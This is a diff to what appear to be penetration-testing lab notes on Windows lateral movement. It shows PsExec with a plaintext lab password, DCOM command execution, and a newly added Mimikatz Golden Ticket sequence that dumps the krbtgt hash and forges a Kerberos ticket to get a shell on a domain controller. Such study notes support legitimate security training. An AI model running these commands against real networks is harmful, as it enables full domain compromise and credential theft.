@@ -76,6 +76,7 @@ Enter-PSSession 1
 - File and Printer Sharing has to be turned on.
 the last two requirements are already met as they are the default settings on modern Windows Server systems.
 //From compromised host to target one
+
 `.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd`
 
 #### PtH
@@ -134,3 +135,21 @@ $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
 tasklist | findstr "calc"
 ```
 //We can also set a revshell into cmd
+
+#### Golden Ticket
+
+```
+privilege::debug
+
+//get the user krbtgt hash
+lsadump::lsa /patch
+
+kerberos::purge
+
+//provide a user, SID 
+kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+
+misc::cmd
+
+PsExec.exe \\dc1 cmd.exe
+```
